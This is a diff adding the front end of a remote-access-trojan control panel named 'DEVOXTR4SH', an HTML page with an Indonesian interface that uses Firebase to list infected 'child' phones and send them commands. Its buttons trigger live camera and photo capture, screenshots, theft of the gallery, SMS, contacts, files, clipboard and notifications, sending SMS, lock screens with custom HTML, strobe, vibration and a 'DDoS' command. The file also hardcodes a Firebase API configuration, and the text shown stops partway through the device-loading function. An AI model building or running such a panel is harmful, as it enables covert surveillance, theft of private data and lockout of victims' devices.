@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DEVOXTR4SH · RAT Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet">
+    <style>
+        /* ============================================================
+           ROOT — DEVONAX THEME
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        :root {
+            --bg: #070707;
+            --card: #131313;
+            --card2: #1b1b1b;
+            --red: #ff2020;
+            --border: #333;
+            --text: #fff;
+            --font-display: 'Orbitron', monospace;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            overflow: hidden;
+            height: 100vh;
+        }
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            background: radial-gradient(circle at top left, #ff000015, transparent 35%),
+                radial-gradient(circle at bottom right, #ff000012, transparent 35%);
+        }
+        .grid {
+            position: fixed;
+            inset: 0;
+            opacity: .04;
+            background-image: linear-gradient(#ff0000 1px, transparent 1px),
+                linear-gradient(90deg, #ff0000 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+        }
+
+        /* ============================================================
+           HEADER
+           ============================================================ */
+        header {
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+            background: #101010;
+            border-bottom: 1px solid #242424;
+            position: relative;
+            z-index: 2;
+        }
+        .iconBtn {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 14px;
+            background: #181818;
+            border: 1px solid #333;
+            cursor: pointer;
+            transition: .25s;
+        }
+        .iconBtn:hover {
+            border-color: var(--red);
+            box-shadow: 0 0 15px rgba(255, 0, 0, .3);
+        }
+        .iconBtn span {
+            font-size: 24px;
+            color: var(--red);
+        }
+        .logo {
+            text-align: center;
+        }
+        .logo h2 {
+            font-size: 16px;
+            letter-spacing: 2px;
+            font-family: var(--font-display);
+        }
+        .logo p {
+            font-size: 9px;
+            color: #888;
+            margin-top: 2px;
+            font-family: var(--font-display);
+        }
+
+        /* ============================================================
+           MAIN LAYOUT
+           ============================================================ */
+        .main {
+            height: calc(100vh - 64px);
+            display: flex;
+            flex-direction: column;
+            padding: 10px 12px 12px;
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ============================================================
+           PAIRING BOX
+           ============================================================ */
+        .pairing-box {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 10px 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            flex-shrink: 0;
+        }
+        .pairing-box .label {
+            font-size: 9px;
+            color: #888;
+            letter-spacing: 1px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .pairing-box .label .material-symbols-outlined {
+            font-size: 16px;
+            color: var(--red);
+        }
+        .pairing-box .id {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--red);
+            font-family: 'Courier New', monospace;
+            letter-spacing: 0.5px;
+            background: rgba(255, 0, 0, 0.06);
+            padding: 2px 12px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 0, 0, 0.1);
+        }
+        .pairing-box .copy-btn {
+            background: none;
+            border: 1px solid var(--border);
+            color: #aaa;
+            padding: 3px 12px;
+            border-radius: 40px;
+            font-size: 9px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .25s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .pairing-box .copy-btn .material-symbols-outlined {
+            font-size: 14px;
+        }
+        .pairing-box .copy-btn:hover {
+            border-color: var(--red);
+            color: var(--red);
+        }
+
+        /* ============================================================
+           STATS ROW
+           ============================================================ */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 10px;
+            flex-shrink: 0;
+        }
+        .stat-item {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 8px 4px;
+            text-align: center;
+        }
+        .stat-item .number {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--red);
+        }
+        .stat-item .number.green {
+            color: #00ff88;
+        }
+        .stat-item .label {
+            font-size: 8px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 1px;
+        }
+
+        /* ============================================================
+           DEVICE LIST + CONTENT
+           ============================================================ */
+        .content-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            gap: 8px;
+            min-height: 0;
+        }
+
+        .device-list {
+            flex: 1;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            padding-right: 2px;
+            min-height: 0;
+        }
+        .device-list::-webkit-scrollbar {
+            width: 4px;
+        }
+        .device-list::-webkit-scrollbar-thumb {
+            background: var(--red);
+            border-radius: 6px;
+        }
+
+        /* ============================================================
+           DEVICE CARD
+           ============================================================ */
+        .device-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 12px 14px;
+            transition: .25s;
+            flex-shrink: 0;
+        }
+        .device-card:hover {
+            border-color: var(--red);
+        }
+        .device-card .top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .device-card .top .name {
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .device-card .top .name .material-symbols-outlined {
+            font-size: 18px;
+            color: var(--red);
+        }
+        .device-card .top .status {
+            font-size: 9px;
+            font-weight: 600;
+            padding: 2px 10px;
+            border-radius: 40px;
+            background: rgba(0, 255, 136, 0.08);
+            color: #00ff88;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+        }
+        .device-card .top .status.offline {
+            background: rgba(255, 0, 0, 0.08);
+            color: #ff4444;
+            border-color: rgba(255, 0, 0, 0.1);
+        }
+        .device-card .meta {
+            font-size: 9px;
+            color: #888;
+            margin: 3px 0 8px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .device-card .meta .battery {
+            color: #00ff88;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+        .device-card .meta .battery .material-symbols-outlined {
+            font-size: 14px;
+        }
+
+        /* ============================================================
+           ACTION BUTTONS — KATEGORI
+           ============================================================ */
+        .action-section {
+            margin-top: 6px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 8px;
+        }
+        .action-section .cat-label {
+            font-size: 8px;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .action-section .cat-label .material-symbols-outlined {
+            font-size: 14px;
+            color: var(--red);
+        }
+        .action-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+        .cmd-btn {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 4px 8px;
+            color: var(--text);
+            font-size: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .2s;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            font-family: 'Inter', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 0.2px;
+        }
+        .cmd-btn .material-symbols-outlined {
+            font-size: 14px;
+        }
+        .cmd-btn:hover {
+            border-color: var(--red);
+            background: rgba(255, 0, 0, 0.06);
+        }
+        .cmd-btn.danger:hover {
+            border-color: #ff4444;
+            background: rgba(255, 0, 0, 0.12);
+        }
+        .cmd-btn.primary {
+            border-color: rgba(0, 255, 136, 0.15);
+        }
+        .cmd-btn.primary:hover {
+            border-color: #00ff88;
+            background: rgba(0, 255, 136, 0.06);
+        }
+        .cmd-btn .label {
+            font-size: 7px;
+            font-weight: 700;
+        }
+
+        /* ============================================================
+           EMPTY STATE
+           ============================================================ */
+        .empty {
+            text-align: center;
+            padding: 30px 16px;
+            color: #555;
+        }
+        .empty .material-symbols-outlined {
+            font-size: 40px;
+            color: #333;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .empty p {
+            font-size: 11px;
+        }
+
+        /* ============================================================
+           RESPONSE LOG
+           ============================================================ */
+        .log-area {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 8px 12px;
+            max-height: 70px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 9px;
+            color: #888;
+            line-height: 1.6;
+            flex-shrink: 0;
+        }
+        .log-area::-webkit-scrollbar {
+            width: 3px;
+        }
+        .log-area::-webkit-scrollbar-thumb {
+            background: var(--red);
+            border-radius: 4px;
+        }
+        .log-area .entry {
+            padding: 1px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+        }
+        .log-area .entry .time {
+            color: #555;
+            margin-right: 6px;
+        }
+        .log-area .entry .msg {
+            color: #ccc;
+        }
+        .log-area .entry .msg.success {
+            color: #00ff88;
+        }
+        .log-area .entry .msg.error {
+            color: #ff4444;
+        }
+        .log-area .entry .msg.warn {
+            color: #ffaa00;
+        }
+
+        /* ============================================================
+           TOAST
+           ============================================================ */
+        .toast {
+            position: fixed;
+            bottom: 16px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1f35;
+            border: 1px solid var(--red);
+            border-radius: 10px;
+            padding: 6px 16px;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text);
+            backdrop-filter: blur(16px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
+            display: none;
+            z-index: 999;
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show {
+            display: block;
+            animation: toastIn 0.3s ease;
+        }
+        @keyframes toastIn {
+            from { opacity: 0; transform: translateX(-50%) translateY(8px); }
+            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+        }
+
+        /* ============================================================
+           MODAL CAMERA
+           ============================================================ */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 16px;
+        }
+        .modal-overlay.show {
+            display: flex;
+        }
+        .modal-content {
+            background: var(--card);
+            border: 1px solid var(--red);
+            border-radius: 16px;
+            padding: 20px;
+            max-width: 480px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        .modal-content .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 14px;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 22px;
+            cursor: pointer;
+        }
+        .modal-content .close-btn:hover {
+            color: var(--red);
+        }
+        .modal-content .modal-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--red);
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 10px;
+        }
+        .modal-content .modal-title .material-symbols-outlined {
+            font-size: 20px;
+        }
+        .modal-content video,
+        .modal-content img {
+            width: 100%;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background: #000;
+        }
+        .modal-content .cam-status {
+            text-align: center;
+            font-size: 9px;
+            color: #888;
+            margin-top: 6px;
+        }
+        .modal-content .cam-status .live {
+            color: #00ff88;
+            font-weight: 700;
+        }
+        .modal-actions {
+            display: flex;
+            gap: 6px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+        .modal-actions .cam-btn {
+            flex: 1;
+            min-width: 50px;
+            padding: 6px 10px;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.03);
+            color: var(--text);
+            font-size: 8px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: .2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            text-transform: uppercase;
+        }
+        .modal-actions .cam-btn .material-symbols-outlined {
+            font-size: 16px;
+        }
+        .modal-actions .cam-btn:hover {
+            border-color: var(--red);
+            background: rgba(255, 0, 0, 0.06);
+        }
+
+        /* ============================================================
+           SCROLL
+           ============================================================ */
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--red);
+            border-radius: 6px;
+        }
+
+        /* ============================================================
+           RESPONSIVE
+           ============================================================ */
+        @media (max-width: 480px) {
+            .pairing-box .id {
+                font-size: 11px;
+                padding: 1px 8px;
+            }
+            .device-card .top .name {
+                font-size: 11px;
+            }
+            .cmd-btn {
+                font-size: 7px;
+                padding: 3px 6px;
+            }
+            .cmd-btn .material-symbols-outlined {
+                font-size: 12px;
+            }
+            .cmd-btn .label {
+                display: none;
+            }
+            .stats-row .stat-item .number {
+                font-size: 15px;
+            }
+            .log-area {
+                max-height: 50px;
+                font-size: 8px;
+            }
+            .modal-content {
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="grid"></div>
+
+    <!-- HEADER -->
+    <header>
+        <div id="backBtn" class="iconBtn">
+            <span class="material-symbols-outlined">arrow_back</span>
+        </div>
+        <div class="logo">
+            <h2>DEVOXTR4SH</h2>
+            <p>RAT Control</p>
+        </div>
+        <div id="logoutBtn" class="iconBtn">
+            <span class="material-symbols-outlined">logout</span>
+        </div>
+    </header>
+
+    <!-- MAIN -->
+    <div class="main">
+
+        <!-- PAIRING BOX -->
+        <div class="pairing-box">
+            <span class="label">
+                <span class="material-symbols-outlined">key</span> PAIRING ID
+            </span>
+            <span class="id" id="pairingId">---</span>
+            <button class="copy-btn" id="copyPairingBtn">
+                <span class="material-symbols-outlined">content_copy</span> COPY
+            </button>
+        </div>
+
+        <!-- STATS -->
+        <div class="stats-row">
+            <div class="stat-item">
+                <div class="number" id="totalDevices">0</div>
+                <div class="label">Total</div>
+            </div>
+            <div class="stat-item">
+                <div class="number green" id="onlineDevices">0</div>
+                <div class="label">Online</div>
+            </div>
+            <div class="stat-item">
+                <div class="number" id="cmdCount">0</div>
+                <div class="label">Commands</div>
+            </div>
+        </div>
+
+        <!-- CONTENT AREA -->
+        <div class="content-area">
+
+            <!-- DEVICE LIST -->
+            <div id="deviceList" class="device-list">
+                <div class="empty">
+                    <span class="material-symbols-outlined">devices</span>
+                    <p>Menunggu perangkat terhubung...</p>
+                </div>
+            </div>
+
+            <!-- RESPONSE LOG -->
+            <div class="log-area" id="logArea">
+                <div class="entry">
+                    <span class="time">[SYSTEM]</span>
+                    <span class="msg">RAT panel siap.</span>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- TOAST -->
+    <div class="toast" id="toast"></div>
+
+    <!-- MODAL CAMERA -->
+    <div class="modal-overlay" id="camModal">
+        <div class="modal-content">
+            <button class="close-btn" id="closeCamModal">
+                <span class="material-symbols-outlined">close</span>
+            </button>
+            <div class="modal-title">
+                <span class="material-symbols-outlined">videocam</span>
+                Live Camera
+            </div>
+            <video id="camVideo" autoplay playsinline style="display:none;"></video>
+            <img id="camImage" style="display:none;width:100%;border-radius:10px;border:1px solid var(--border);background:#000;" />
+            <div class="cam-status" id="camStatus">
+                <span class="live">● LIVE</span> <span id="camDeviceLabel">-</span>
+            </div>
+            <div class="modal-actions">
+                <button class="cam-btn" id="camCaptureBtn">
+                    <span class="material-symbols-outlined">photo_camera</span> Capture
+                </button>
+                <button class="cam-btn" id="camDownloadBtn" style="display:none;">
+                    <span class="material-symbols-outlined">download</span> Unduh
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- FIREBASE SDK -->
+    <script type="importmap">
+        {
+            "imports": {
+                "firebase/app": "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js",
+                "firebase/auth": "https://www.gstatic.com/firebasejs/12.16.0/firebase-auth.js",
+                "firebase/database": "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js"
+            }
+        }
+    </script>
+
+    <script type="module">
+        // ============================================================
+        // IMPORTS
+        // ============================================================
+        import { initializeApp } from "firebase/app";
+        import { getAuth, onAuthStateChanged, signOut } from "firebase/auth";
+        import {
+            getDatabase,
+            ref,
+            get,
+            set,
+            onValue,
+            remove,
+            update
+        } from "firebase/database";
+
+        // ============================================================
+        // FIREBASE CONFIG
+        // ============================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyAV5qFI5J0cZd0eg2Q6mhEZ0KEiR1URv1c",
+            authDomain: "project-coding-gabut.firebaseapp.com",
+            databaseURL: "https://project-coding-gabut-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "project-coding-gabut",
+            storageBucket: "project-coding-gabut.firebasestorage.app",
+            messagingSenderId: "234910334669",
+            appId: "1:234910334669:web:5203c9e9ce22a596f2b384"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getDatabase(app);
+
+        // ============================================================
+        // DOM REFS
+        // ============================================================
+        const backBtn = document.getElementById('backBtn');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const pairingIdEl = document.getElementById('pairingId');
+        const copyBtn = document.getElementById('copyPairingBtn');
+        const deviceList = document.getElementById('deviceList');
+        const logArea = document.getElementById('logArea');
+        const totalDevicesEl = document.getElementById('totalDevices');
+        const onlineDevicesEl = document.getElementById('onlineDevices');
+        const cmdCountEl = document.getElementById('cmdCount');
+        const toast = document.getElementById('toast');
+
+        // Modal
+        const camModal = document.getElementById('camModal');
+        const closeCamBtn = document.getElementById('closeCamModal');
+        const camVideo = document.getElementById('camVideo');
+        const camImage = document.getElementById('camImage');
+        const camStatus = document.getElementById('camStatus');
+        const camDeviceLabel = document.getElementById('camDeviceLabel');
+        const camCaptureBtn = document.getElementById('camCaptureBtn');
+        const camDownloadBtn = document.getElementById('camDownloadBtn');
+
+        let currentUser = null;
+        let pairingId = '';
+        let cmdCounter = 0;
+        let currentDeviceId = null;
+        let currentFrame = null;
+        let camListenerRef = null;
+        let deviceListeners = {};
+
+        // ============================================================
+        // TOAST
+        // ============================================================
+        function showToast(msg, dur = 3000) {
+            toast.textContent = msg;
+            toast.classList.add('show');
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => toast.classList.remove('show'), dur);
+        }
+
+        // ============================================================
+        // LOG
+        // ============================================================
+        function addLog(msg, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = 'entry';
+            const time = new Date().toLocaleTimeString('id-ID', {
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            const cls = type === 'success' ? 'success' : type === 'error' ? 'error' : type === 'warn' ? 'warn' : '';
+            entry.innerHTML =
+                `<span class="time">[${time}]</span> <span class="msg ${cls}">${msg}</span>`;
+            logArea.appendChild(entry);
+            logArea.scrollTop = logArea.scrollHeight;
+            if (logArea.children.length > 50) {
+                logArea.removeChild(logArea.children[0]);
+            }
+        }
+
+        // ============================================================
+        // BACK & LOGOUT
+        // ============================================================
+        backBtn.addEventListener('click', () => { history.back(); });
+
+        logoutBtn.addEventListener('click', async () => {
+            await signOut(auth);
+            showToast('Keluar dari panel.');
+            setTimeout(() => { window.location.href = 'login.html'; }, 500);
+        });
+
+        // ============================================================
+        // COPY PAIRING ID
+        // ============================================================
+        copyBtn.addEventListener('click', () => {
+            if (pairingId) {
+                navigator.clipboard.writeText(pairingId);
+                showToast('Pairing ID disalin.');
+            }
+        });
+
+        // ============================================================
+        // GENERATE PAIRING ID
+        // ============================================================
+        function generatePairingId(uid) {
+            const suffix = Date.now().toString(36).toUpperCase().slice(-6);
+            const uidPart = uid.slice(-6).toUpperCase();
+            return `DX-${uidPart}-${suffix}`;
+        }
+
+        // ============================================================
+        // SEND COMMAND
+        // ============================================================
+        function sendCommand(deviceId, command, payload = {}) {
+            if (!deviceId) {
+                showToast('Pilih perangkat terlebih dahulu.');
+                return;
+            }
+            const cmdRef = ref(db, `commands/${deviceId}`);
+            const data = {
+                command,
+                payload,
+                timestamp: Date.now(),
+                id: ++cmdCounter
+            };
+            set(cmdRef, data)
+                .then(() => {
+                    addLog(`📤 ${command.toUpperCase()} → ${deviceId.slice(0, 8)}...`, 'success');
+                    cmdCountEl.textContent = cmdCounter;
+                    showToast(`Command ${command.toUpperCase()} terkirim.`);
+                })
+                .catch(err => {
+                    addLog(`❌ Gagal kirim ${command}: ${err.message}`, 'error');
+                    showToast('Gagal kirim command.');
+                });
+        }
+
+        // ============================================================
+        // OPEN CAM MODAL
+        // ============================================================
+        function openCamModal(deviceId) {
+            currentDeviceId = deviceId;
+            camModal.classList.add('show');
+            camDeviceLabel.textContent = deviceId.slice(0, 10) + '...';
+            camImage.style.display = 'none';
+            camVideo.style.display = 'none';
+            camDownloadBtn.style.display = 'none';
+            currentFrame = null;
+
+            addLog(`📹 Buka live cam untuk ${deviceId.slice(0, 8)}...`, 'warn');
+
+            // Listen for camera stream
+            if (camListenerRef) {
+                camListenerRef();
+                camListenerRef = null;
+            }
+
+            const camRef = ref(db, `camera/${deviceId}`);
+            camListenerRef = onValue(camRef, (snap) => {
+                const data = snap.val();
+                if (data && data.image) {
+                    camVideo.style.display = 'none';
+                    camImage.style.display = 'block';
+                    camImage.src = data.image;
+                    currentFrame = data.image;
+                    camDownloadBtn.style.display = 'flex';
+                    addLog('📸 Frame camera diterima.', 'success');
+                } else if (data && data.video) {
+                    camImage.style.display = 'none';
+                    camVideo.style.display = 'block';
+                    camVideo.src = data.video;
+                    camVideo.play();
+                    camDownloadBtn.style.display = 'none';
+                    addLog('🎥 Stream video aktif.', 'success');
+                }
+            });
+
+            // Kirim perintah livecam
+            sendCommand(deviceId, 'livecam', { mode: 'camera' });
+        }
+
+        function closeCamModal() {
+            camModal.classList.remove('show');
+            if (camListenerRef) {
+                camListenerRef();
+                camListenerRef = null;
+            }
+            camVideo.pause();
+            camVideo.src = '';
+            camImage.style.display = 'none';
+            camImage.src = '';
+            currentDeviceId = null;
+            currentFrame = null;
+            camDownloadBtn.style.display = 'none';
+            addLog('📹 Live cam ditutup.', 'info');
+        }
+
+        closeCamBtn.addEventListener('click', closeCamModal);
+
+        // Capture photo
+        camCaptureBtn.addEventListener('click', () => {
+            if (!currentDeviceId) return;
+            sendCommand(currentDeviceId, 'capture');
+            showToast('📸 Capture dikirim.');
+        });
+
+        // Download photo
+        camDownloadBtn.addEventListener('click', () => {
+            if (currentFrame) {
+                const link = document.createElement('a');
+                link.href = currentFrame;
+                link.download = `capture_${Date.now()}.jpg`;
+                link.click();
+                showToast('⬇️ Gambar diunduh.');
+                addLog('⬇️ Gambar diunduh.', 'success');
+            }
+        });
+
+        // ============================================================
+        // RENDER DEVICE CARD
+        // ============================================================
+        function renderDevice(deviceId, data) {
+            const isOnline = data.online === true;
+            const card = document.createElement('div');
+            card.className = 'device-card';
+            card.dataset.deviceId = deviceId;
+
+            const batt = data.battery || 0;
+            const battColor = batt > 50 ? '#00ff88' : batt > 20 ? '#ffaa00' : '#ff4444';
+            const battIcon = batt > 70 ? 'battery_full' : batt > 40 ? 'battery_medium' : 'battery_low';
+
+            card.innerHTML = `
+                    <div class="top">
+                        <div class="name">
+                            <span class="material-symbols-outlined">${isOnline ? 'devices' : 'devices_off'}</span>
+                            ${data.deviceName || deviceId.slice(0, 10)}
+                        </div>
+                        <div class="status ${isOnline ? '' : 'offline'}">
+                            ${isOnline ? 'ONLINE' : 'OFFLINE'}
+                        </div>
+                    </div>
+                    <div class="meta">
+                        <span>${data.model || 'Unknown'}</span>
+                        <span class="battery">
+                            <span class="material-symbols-outlined">${battIcon}</span>
+                            ${batt}%
+                        </span>
+                        <span>${data.lastSeen ? new Date(data.lastSeen).toLocaleString() : '-'}</span>
+                    </div>
+
+                    <!-- CAMERA -->
+                    <div class="action-section">
+                        <div class="cat-label">
+                            <span class="material-symbols-outlined">photo_camera</span> CAMERA
+                        </div>
+                        <div class="action-grid">
+                            <button class="cmd-btn primary" data-cmd="livecam" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">videocam</span>
+                                <span class="label">LIVE</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="capture" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">photo_camera</span>
+                                <span class="label">SS</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- ATTACK -->
+                    <div class="action-section">
+                        <div class="cat-label">
+                            <span class="material-symbols-outlined">bolt</span> ATTACK
+                        </div>
+                        <div class="action-grid">
+                            <button class="cmd-btn danger" data-cmd="ddos" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">wifi</span>
+                                <span class="label">DDoS</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="vibrate" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">vibration</span>
+                                <span class="label">VIB</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="strobe_on" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">flash_on</span>
+                                <span class="label">ON</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="strobe_off" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">flash_off</span>
+                                <span class="label">OFF</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- CONTROL -->
+                    <div class="action-section">
+                        <div class="cat-label">
+                            <span class="material-symbols-outlined">settings</span> CONTROL
+                        </div>
+                        <div class="action-grid">
+                            <button class="cmd-btn primary" data-cmd="lock" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">lock</span>
+                                <span class="label">LOCK</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="unlock" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">lock_open</span>
+                                <span class="label">UNLOCK</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="lock_html" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">code</span>
+                                <span class="label">HTML</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="play_sound" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">volume_up</span>
+                                <span class="label">SOUND</span>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- MEDIA -->
+                    <div class="action-section">
+                        <div class="cat-label">
+                            <span class="material-symbols-outlined">folder</span> MEDIA
+                        </div>
+                        <div class="action-grid">
+                            <button class="cmd-btn" data-cmd="gallery" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">image</span>
+                                <span class="label">GALERI</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="sms" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">sms</span>
+                                <span class="label">SMS</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="contacts" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">contacts</span>
+                                <span class="label">KONTAK</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="files" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">folder_open</span>
+                                <span class="label">FILE</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="screenshot" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">screenshot</span>
+                                <span class="label">SS</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="clipboard" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">content_copy</span>
+                                <span class="label">CLIP</span>
+                            </button>
+                            <button class="cmd-btn" data-cmd="notification" data-device="${deviceId}">
+                                <span class="material-symbols-outlined">notifications</span>
+                                <span class="label">NOTIF</span>
+                            </button>
+                        </div>
+                    </div>
+                `;
+
+            // Event listener untuk semua tombol command
+            card.querySelectorAll('[data-cmd]').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    const cmd = btn.dataset.cmd;
+                    const device = btn.dataset.device;
+
+                    // Special: livecam -> buka modal
+                    if (cmd === 'livecam') {
+                        openCamModal(device);
+                        return;
+                    }
+
+                    // Special: strobe_on / strobe_off
+                    if (cmd === 'strobe_on') {
+                        sendCommand(device, 'strobe', { mode: 'on' });
+                        return;
+                    }
+                    if (cmd === 'strobe_off') {
+                        sendCommand(device, 'strobe', { mode: 'off' });
+                        return;
+                    }
+
+                    // Special: ddos
+                    if (cmd === 'ddos') {
+                        sendCommand(device, 'ddos', { target: 'wifi' });
+                        return;
+                    }
+
+                    // Special: lock_html
+                    if (cmd === 'lock_html') {
+                        const html = prompt('Masukkan HTML lock page:', '<h1>DEVICE LOCKED</h1>');
+                        if (html !== null) {
+                            sendCommand(device, 'lock_html', { html: html });
+                        }
+                        return;
+                    }
+
+                    // Special: notification with message
+                    if (cmd === 'notification') {
+                        const msg = prompt('Pesan notifikasi:', '⚠️ Security Alert!');
+                        if (msg !== null) {
+                            sendCommand(device, 'notification', { message: msg });
+                        }
+                        return;
+                    }
+
+                    // Special: sms
+                    if (cmd === 'sms') {
+                        const number = prompt('Nomor tujuan:', '08123456789');
+                        const msg = prompt('Pesan SMS:', 'Halo dari DEVOXTR4SH');
+                        if (number !== null && msg !== null) {
+                            sendCommand(device, 'sms', { number, message: msg });
+                        }
+                        return;
+                    }
+
+                    // Kirim command biasa
+                    sendCommand(device, cmd);
+                });
+            });
+
+            return card;
+        }
+
+        // ============================================================
+        // LOAD DEVICES
+        // ============================================================
+        function loadDevices() {
+            if (!pairingId) return;
+
+            if (window._devicesListener) {
+                window._devicesListener();
+                window._devicesListener = null;
+            }
+
+            const devicesRef = ref(db, `childDevices/${pairingId}`);
+            window._devicesListener = onValue(devicesRef, (snapshot) => {
+                const data = snapshot.val();
+                deviceList.innerHTML = '';
+                let online = 0;
+                let total = 0;
+
+                if (!data) {
